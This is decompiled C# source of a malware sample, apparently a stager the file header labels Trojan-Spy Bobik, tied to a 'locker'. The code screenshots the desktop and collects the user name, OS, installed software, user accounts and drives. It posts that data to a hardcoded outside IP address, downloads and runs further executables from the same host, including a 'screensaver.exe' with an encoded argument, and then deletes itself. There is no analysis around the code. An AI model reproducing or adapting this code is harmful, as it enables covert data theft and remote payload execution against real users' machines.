// Decompiled with JetBrains decompiler
// Type: setup.App
// Assembly: setup, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 95C225EB-6E6B-4374-8E73-8564F911E43A
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Spy.MSIL.Bobik.gen-c7f353c4ca722da712da454317e9d00b77c9b6cf6194b47009dbd67517cf2abc.exe

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace setup
{
  internal class App
  {
    private const string GateIP = "91.92.128.152";
    private const string APIUrl = "http://91.92.128.152/upload";
    private const string FilesUrl = "http://91.92.128.152/files/";
    private static string AppName = "";
    private static string ScreenSaverName = "screensaver.exe";
    private static string ScreenSaverArgs = "7C28913B6F1CE6E452678F117954BF4EJ7521E2B4A224740AAF64D5FAD08520ACDF9F8912E7DE";

    public static void Start(string[] args)
    {
      App.DetectAppName();
      if (MessageBox.Show("REALLY RUN LOCKER????", App.AppName, MessageBoxButtons.YesNo) == DialogResult.No)
      {
        Environment.Exit(0);
      }
      else
      {
        if (!Runner.CheckSingle())
          Environment.Exit(0);
        Runner.HideAllWindows();
        App.FileInfo[] Files = new App.FileInfo[1]
        {
          new App.FileInfo()
          {
            Name = "desktop",
            Content = ScreenShot.MakeDesktopScreenshot()
          }
        };
        App.DownloadAndRun(App.AppName + ".exe");
        App.UploadDedInfo(Files, App.FullInfo());
        App.DownloadAndRun(App.ScreenSaverName, App.ScreenSaverArgs, false);
        Runner.SelfRemove();
      }
    }

    private static void DetectAppName()
    {
      string withoutExtension = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
      if (withoutExtension.Contains("_"))
      {
        App.AppName = withoutExtension.Split('_')[1].Trim();
      }
      else
      {
        int num = (int) MessageBox.Show("MUST BE like setup_appname.exe");
      }
    }

    private static void DownloadAndRun(string ExeName, string Args = "", bool Confirm = true)
    {
      using (WebClient webClient = new WebClient())
      {
        bool flag = true;
        while (flag)
        {
          try
          {
            webClient.DownloadFile(new Uri("http://91.92.128.152/files/" + ExeName), ExeName);
            if (!Confirm && MessageBox.Show("Start " + ExeName + "?", ExeName, MessageBoxButtons.YesNo) != DialogResult.Yes)
              break;
            Process.Start(ExeName, Args);
            break;
          }
          catch (Exception ex)
          {
            if (MessageBox.Show(ex.Message + "\r\nTry now??", "Download and run " + ExeName + " error", MessageBoxButtons.YesNo) == DialogResult.No)
            {
              Runner.SelfRemove();
              flag = false;
            }
          }
        }
      }
    }

    private static void UploadDedInfo(App.FileInfo[] Files, NameValueCollection Info)
    {
      bool flag = true;
      while (flag)
      {
        try
        {
          App.UploadFiles("http://91.92.128.152/upload", (IEnumerable<App.FileInfo>) Files, Info);
          break;
        }
        catch (Exception ex)
        {
          if (MessageBox.Show(ex.Message + "\r\nRETRY SEND??", "UPLOAD ERROR", MessageBoxButtons.YesNo) == DialogResult.No)
          {
            Runner.SelfRemove();
            flag = false;
          }
        }
      }
    }

    private static NameValueCollection FullInfo() => new NameValueCollection()
    {
      {
        "login",
        Environment.UserName
      },
      {
        "os",
        OSInfo.GetOSName()
      },
      {
        "language",
        OSInfo.GetOSLang()
      },
      {
        "timezone",
        OSInfo.GetTimeZone()
      },
      {
        "key",
        OSInfo.LBRegID()
      },
      {
        "keyboards",
        string.Join("\r\n", OSInfo.GetKeyboards())
      },
      {
        "users",
        string.Join("\r\n", OSInfo.GetUsers())
      },
      {
        "soft",
        string.Join("\r\n", OSInfo.GetInstalledSoft())
      },
      {
        "drives",
        string.Join("\r\n", OSInfo.GetDrivesInfo())
      },
      {
        "sender",
        App.AppName
      }
    };

    public static void UploadFiles(
      string address,
      IEnumerable<App.FileInfo> files,
      NameValueCollection values)
    {
      WebRequest webRequest = WebRequest.Create(address);
      webRequest.Method = "POST";
      string str1 = "---------------------------" + DateTime.Now.Ticks.ToString("x", (IFormatProvider) NumberFormatInfo.InvariantInfo);
      webRequest.ContentType = "multipart/form-data; boundary=" + str1;
      string str2 = "--" + str1;
      using (Stream requestStream = webRequest.GetRequestStream())
      {
        foreach (string key in values.Keys)
        {
          byte[] bytes1 = Encoding.ASCII.GetBytes(str2 + Environment.NewLine);
          requestStream.Write(bytes1, 0, bytes1.Length);
          byte[] bytes2 = Encoding.ASCII.GetBytes(string.Format("Content-Disposition: form-data; name=\"{0}\"{1}{1}", (object) key, (object) Environment.NewLine));
          requestStream.Write(bytes2, 0, bytes2.Length);
          byte[] bytes3 = Encoding.UTF8.GetBytes(values[key] + Environment.NewLine);
          requestStream.Write(bytes3, 0, bytes3.Length);
        }
        foreach (App.FileInfo file in files)
        {
          byte[] bytes4 = Encoding.ASCII.GetBytes(str2 + Environment.NewLine);
          requestStream.Write(bytes4, 0, bytes4.Length);
          byte[] bytes5 = Encoding.UTF8.GetBytes(string.Format("Content-Disposition: form-data; name=\"{0}\"; filename=\"{1}\"{2}", (object) file.Name, (object) file.Filename, (object) Environment.NewLine));
          requestStream.Write(bytes5, 0, bytes5.Length);
          byte[] bytes6 = Encoding.ASCII.GetBytes(string.Format("Content-Type: {0}{1}{1}", (object) file.ContentType, (object) Environment.NewLine));
          requestStream.Write(bytes6, 0, bytes6.Length);
          requestStream.Write(file.Content, 0, file.Content.Length);
          byte[] bytes7 = Encoding.ASCII.GetBytes(Environment.NewLine);
          requestStream.Write(bytes7, 0, bytes7.Length);
        }
        byte[] bytes = Encoding.ASCII.GetBytes(str2 + "--");
        requestStream.Write(bytes, 0, bytes.Length);
      }
      webRequest.GetResponse().Close();
    }

    public class FileInfo
    {
      public string Name;
      public string Filename = "file.bin";
      public string ContentType = "application/octet-stream";
      public byte[] Content;
    }
  }
}
